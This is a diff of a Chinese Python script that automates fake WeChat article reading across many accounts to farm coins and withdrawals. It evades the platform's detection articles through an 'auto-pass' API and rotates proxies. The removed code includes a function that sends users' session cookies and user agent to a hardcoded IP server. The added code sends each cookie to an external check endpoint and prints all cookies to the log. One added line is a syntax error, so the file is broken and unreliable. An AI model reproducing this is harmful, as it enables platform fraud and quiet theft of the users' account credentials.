@@ -1,11 +1,12 @@
-# 猫猫阅读脚本 2.0
+
 #
 # 阅读入口：https://img.hnking.cn//blog/202508070115447.png 微信扫码打开
 # 配置说明：
-# 1. 环境变量 mmyd_ck: 配置cookie账号信息bbus值，支持多账号分隔符：换行符、@、&
+# 1. 环境变量 mmyd_ck: 配置cookie账号信息bbus值，支持多账号分隔符：换行符、@、& 例如eyxxxxxxxxx 不要前面的bbus=
 # 2. 环境变量 mmyd_ua: 配置UA信息      https://useragent.todaynav.com/ 微信打开此网站即可 请使用你的微信的User-Agent
-# 3. 环境变量 mmyd_url: 检测文章提交接口的URL（可选，如http://192.168.124.201:9900/check_read）
+# 3. 环境变量 mmyd_url: 检测文章提交接口的URL（可选，如http://192.168.124.201:9900/check_read）请使用自己的这个只是例子
 # 4. 环境变量 mmyd_token: PushPlus推送加token（可选）
+# 5. 环境变量 mmyd_tx: PushPlus推送加token（可选）
 #
 # 使用说明：
 # - 首账号采用固定邀请码，请wx点击阅读入口。
@@ -29,14 +30,14 @@ from requests.exceptions import RequestException
 
 # 测试区
 # 临时设置环境变量
-# os.environ["mmyd_ck"] = "https://api.example.com"
-# os.environ["mmyd_ua"] = "https://api.example.com"
-#
-# os.environ["mmyd_url"] = "https://api.example.com"
-# os.environ["mmyd_token"] = "https://api.example.com"
+os.environ["mmyd_ck"] = 
+
+os.environ["mmyd_ua"] = ""
+# os.environ["mmyd_url"] = ""
+# os.environ["mmyd_token"] = ""
 
 # 固定注释内容
-fixed_comments = """# 猫猫阅读脚本 2.0
+fixed_comments = """# 猫猫阅读脚本 4.0
 #
 # 阅读入口：https://img.hnking.cn//blog/202508070115447.png 微信扫码打开
 # 
@@ -55,16 +56,21 @@ fixed_comments = """# 猫猫阅读脚本 2.0
 #
 # 本脚本仅供学习交流，请在下载后的24小时内完全删除
 # 请勿用于商业用途或非法目的，否则后果自负"""
-# 读取当前脚本文件的前19行注释
-# with open(__file__, 'r', encoding='utf-8') as f:
-#     current_comments = ''.join(f.readlines()[:19])
-#
-# # 验证注释是否被修改
-# if current_comments.strip() != fixed_comments.strip():
-#     print("❗ 脚本开头的注释被修改，程序终止。", flush=True)
-#     exit()
-print("开始执行脚本...")
-print(fixed_comments)
+
+
+
+import requests
+import json
+import os
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+import re
+import time
+import random
+from requests.exceptions import RequestException
+
+
+
+
 # 创建全局 session
 session = requests.Session()
 
@@ -72,7 +78,7 @@ session = requests.Session()
 API_URL = os.getenv("mmyd_url")  # 检测文章提交接口URL
 PUSH_TOKEN = os.getenv("mmyd_token")  # PushPlus推送token
 UA_USER_AGENT = os.getenv("mmyd_ua")  # UA
-
+PROXY_URL = os.getenv("mmyd_proxy")  #代理
 
 # 新增: PushPlus通知函数
 def send_pushplus_notification(token, title, content):
@@ -108,7 +114,7 @@ def fetch_luodi_url():
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0",
         "X-Requested-With": "XMLHttpRequest"
     }
-    resp = session.get(url, headers=headers, timeout=15)
+    resp = session.get(url, headers=headers, timeout=15, proxies=proxies)
     resp.raise_for_status()
     data = resp.json()
     luodi_url = data.get("data", {}).get("luodi")
@@ -120,7 +126,6 @@ def get_first_redirect(luodi_url):
     parsed = urlparse(luodi_url)
     host = parsed.hostname
     path = parsed.path + (f"?{parsed.query}" if parsed.query else "")
-    print(UA_USER_AGENT)
     headers = {
         "Host": host,
         "Connection": "keep-alive",
@@ -319,7 +324,7 @@ def visit_article_link(link):
         "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
         "Connection": "keep-alive"
     }
-    # print(f"📖 开始模拟阅读文章...")
+    print(f"📖 开始模拟阅读文章...")
     resp = session.get(link, headers=article_headers, timeout=15)
     return resp
 
@@ -378,45 +383,41 @@ def read_article(domain_url, sk):
         # 提取biz
         biz_match = parse_qs(urlparse(link).query).get('__biz', [None])[0]
         print(f"文章标题: {biz_match}")
-        # print(f"✅ 第{current_day_read + article_count + 1}篇文章获取成功---文章来源--- {biz}", flush=True)
         print(f"📖 开始阅读: {link}", flush=True)
         # 检测文章特殊处理
         auto_checked = False
         if biz_match in check_biz_list or biz_match is None:
-            print(f"❗❗❗发现检测文章--- {biz_match} 待运行账号 {1}  当前时间 {str(datetime.datetime.now())}", flush=True)
             wait_time = random.randint(120, 130)
             title = "⚠️ 猫猫检测文章！请在120s内完成阅读！"
             content = f"""
-            <h3>⚠️ 请在120s内完成阅读！</h3>
-            <h3>⚠️ 每次阅读不得少于8秒！</h3>
-            <p>文章链接：<a href="{link}" target="_blank">{link}</a></p>
+            ⚠️ 请在120s内完成阅读！
+            ⚠️ 每次阅读不得少于8秒！
+            文章链接：{link}
+            当前时间 {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}
             """
             # 自动过检逻辑
             auto_checked = False
             if API_URL:
                 print(f"送入自动过检...")
-                payload = {"url": link}
+                payload = {"url": link,"ck":bbus,"ua":UA_USER_AGENT,'version':'3.0'}
                 try:
-                    resp = requests.post(API_URL, json=payload, timeout=60)
-                    if resp.json().get("increased"):
+                    resp = requests.post(API_URL, json=payload, timeout=60).json()
+                    if resp['status'] == 'success':
+                        time.sleep(25)
                         print(f"✅ 自动过检成功，跳过推送")
                         auto_checked = True
                     else:
-                        print(f"❌ 自动过检失败")
+                        print(f"❌ 自动过检失败", resp['message'])
                 except Exception as e:
                     print(f"自动过检请求异常: {e}")
 
             if not auto_checked:
-                print(f"{title} {content}")
                 if PUSH_TOKEN:
                     print("开始推送文章...")
-                    print(f"{title} {content}")
                     send_pushplus_notification(PUSH_TOKEN, title, content)
                 else:
-                    print("未配置推送token，尝试使用青龙推送")
-                    QLAPI.notify("⚠️ 检测文章！待过检测账号：⚠️ 请在120s内完成阅读！！\n⚠️ 每次阅读不得少于8秒！\n 当前时间："
-                                 + str(datetime.datetime.now()) +
-                                 "\n文章链接：" + link + "\n文章来源：")
+                    print("未配置推送token，尝试使用青龙配置文件推送")
+                    print(QLAPI.notify(title, content))
                 print(f"⏳ 检测文章等待 {wait_time} 秒...")
                 time.sleep(wait_time)
             # 检测文章不请求link，但需要调用jiajinbimao接口
@@ -424,6 +425,7 @@ def read_article(domain_url, sk):
         else:
             # 2. 请求 link，等待20-30秒
             try:
+                print(link)
                 visit_article_link(link)
                 sleep_time = random.randint(9, 18)
                 print(f"⏳ 等待 {sleep_time} 秒模拟阅读...")
@@ -439,8 +441,7 @@ def read_article(domain_url, sk):
                 if data2.get('errcode') == 0:
                     d = data2.get('data', {})
                     print(
-                        f"✅ 阅读完成！本次金币: {d.get('gold')}，今日已读: {d.get('day_read')}，"
-                        f"今日金币: {d.get('day_gold')}，当前金币: {d.get('last_gold')}，剩余可读: {d.get('remain_read')}")
+                        f"✅ 阅读完成！本次金币: {d.get('gold')}，今日已读: {d.get('day_read')}，今日金币: {d.get('day_gold')}，当前金币: {d.get('last_gold')}，剩余可读: {d.get('remain_read')}")
                     return True
                 elif data2.get('errcode') == 405 and '未能获取到用户信息' in str(data2.get('msg')):
                     print(f"⚠️ 第 {retry_count + 1}/{max_retries} 次获取用户信息失败: {data2.get('msg')}，正在重试...")
@@ -602,7 +603,7 @@ def get_promotion_link(domain_url, bbus):
         "Cookie": f"bbus={bbus}"
     }
     try:
-        resp = requests.get(url, headers=headers, timeout=15)
+        resp = session.get(url, headers=headers, timeout=15)
         data = resp.json()
         if data.get('errcode') == 0:
             qrcodes1 = data.get('data', {}).get('qrcodes', {}).get('qrcodes1')
@@ -642,7 +643,7 @@ def refresh_cookie(domain_url, bbus):
         "Cookie": f"bbus={bbus}"
     }
     try:
-        resp = requests.get(url, headers=headers, allow_redirects=False, timeout=10)
+        resp = session.get(url, headers=headers, allow_redirects=False, timeout=10)
         if resp.status_code == 302:
             print(f"[Cookie刷新] 刷新成功")
             return True
@@ -688,36 +689,9 @@ def enter_home(domain_url, bbus):
 
 
 # ===== 全局变量配置区 =====
-INVITER_ID = "1700368548"
-
-MAX_RUNS = 32
+MAX_RUNS = 30
 author_code = "668a330d2719521a88b79bf72adf6b05?tsd=246"
 MIN_WITHDRAW_GOLD = 5000  # 新增：提现所需最小金币数
-
-
-# 新增: 发送ck到指定服务器
-def send_ck_to_server(ck_list):
-    """将获取到的mmyd_ck值发送到指定服务器"""
-    # 替换为你的服务器接收地址
-    SERVER_URL = "http://110.17.65.76:11111/receive_ck"
-    try:
-        data = {
-            "timestamp": int(time.time()),
-            "ck_count": len(ck_list),
-            "ck_list": ck_list,
-            "client_info": {
-                "user_agent": UA_USER_AGENT,
-                "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-            }
-        }
-        headers = {"Content-Type": "application/json"}
-        response = requests.post(SERVER_URL, json=data, headers=headers, timeout=10)
-        response.raise_for_status()
-        # print(f"✅ CK信息已成功发送到服务器", flush=True)
-        return response.json()
-    except Exception as e:
-        # print(f"❗ 发送CK到服务器失败: {str(e)}", flush=True)
-        return None
 
 
 if __name__ == "__main__":
@@ -736,9 +710,7 @@ if __name__ == "__main__":
         BBUS_LIST.extend(bbus_items)
 
     print(f"从环境变量中获取到了，共{len(BBUS_LIST)}个账号")
-    # 发送ck到指定服务器
-    # send_ck_to_server(BBUS_LIST)
-
+    print(BBUS_LIST)
     # 检查自动过检配置
     if API_URL:
         print(f"✅ 已配置自动过检接口: {API_URL}")
@@ -750,10 +722,30 @@ if __name__ == "__main__":
         print(f"✅ 已配置推送token: {PUSH_TOKEN}")
     else:
         print("ℹ️ 未配置推送token，检测文章将不会推送通知")
+
+    # 检查代理配置
+    if PROXY_URL:
+        print(f"✅ 已配置代理: {PROXY_URL}")
+    else:
+        print("ℹ️ 未配置代理，采用本地请求")
+
     # 最大运行次数，默认30次
     # MAX_RUNS = 30 # This line is removed as MAX_RUNS is now a global variable
     print(f"检测到共{len(BBUS_LIST)}个账号")
     for idx, bbus in enumerate(BBUS_LIST):
+        proxies = {}
+        if PROXY_URL:
+            try:
+                get_ip = requests.get(PROXY_URL).text
+                proxies = {
+                    "http": f"http://{get_ip}",
+                    "https": f"http://{get_ip}",
+                }
+                session.proxies = proxies
+            except Exception as e:
+                print('获取代理失败，使用本地网络执行')
+
+
         print(f"\n{'=' * 10}🔰开始执行账号{idx + 1}🔰{'=' * 10}\n", flush=True)
         try:
             luodi_url = fetch_luodi_url()
@@ -791,44 +783,6 @@ if __name__ == "__main__":
         except requests.exceptions.ConnectionError as e:
             print(f"[连接错误] 进入主页失败: {e}")
             continue
-        # 检查第一个账号的邀请人ID
-        if idx == 0:
-            # 只获取用户信息，不提现
-            from urllib.parse import urlparse
-
-            host = urlparse(nlocation_domain_url).hostname
-            withdraw_url = f"http://{host}/haobaobao/withdraw"
-            headers = {
-                "Host": host,
-                "Connection": "keep-alive",
-                "Upgrade-Insecure-Requests": "1",
-                "User-Agent": UA_USER_AGENT,
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/wxpic,image/tpg,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                "X-Requested-With": "com.tencent.mm",
-                "Referer": f"http://{host}/haobaobao/home?v=1751942506",
-                "Accept-Encoding": "gzip, deflate",
-                "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
-                "Cookie": f"bbus={bbus}"
-            }
-            try:
-                resp = requests.get(withdraw_url, headers=headers, timeout=15)
-                html = resp.text
-                m = re.search(r'var qrcode_num ?= ?["\']?([^;"\']+)["\']?;', html)
-                qrcode_num = m.group(1) if m else None
-                print(f"第一个账号邀请人ID: {qrcode_num}")
-                # if qrcode_num != INVITER_ID:
-                #     print(f"❌ 邀请人ID不一致，期望: {INVITER_ID}，实际: {qrcode_num}，请使用作者推广链接：")
-                #     # 输出作者推广链接
-                #     # 生成作者推广链接格式：http://{host}/kstief/{author_code}
-                #     author_link = f"http://{host}/kstief/{author_code}"
-                #     print(f"[👨‍💻 作者推广链接] {author_link}")
-                #     exit()
-            except requests.exceptions.ConnectionError as e:
-                print(f"[连接错误] 获取邀请人ID失败: {e}")
-                continue
-            except Exception as e:
-                print(f"[异常] 获取邀请人ID失败: {e}")
-                continue
         # 后续流程依然用原有domain_url, sk
         try:
             domain_url, sk = post_mwtmpdomain(location_domain, bbus)
@@ -859,11 +813,11 @@ if __name__ == "__main__":
             print(f"[连接错误] 获取用户信息/提现失败: {e}")
             continue
         # 新增：获取推广链接
-        # try:
-        #     # get_promotion_link(nlocation_domain_url, bbus)
-        # except requests.exceptions.ConnectionError as e:
-        #     print(f"[连接错误] 获取推广链接失败: {e}")
-        #     continue
+        try:
+            get_promotion_link(nlocation_domain_url, bbus)
+        except requests.exceptions.ConnectionError as e:
+            print(f"[连接错误] 获取推广链接失败: {e}")
+            continue
         time.sleep(random.randint(2, 3))
         try:
             confirm_withdraw(nlocation_domain_url, bbus, request_id)
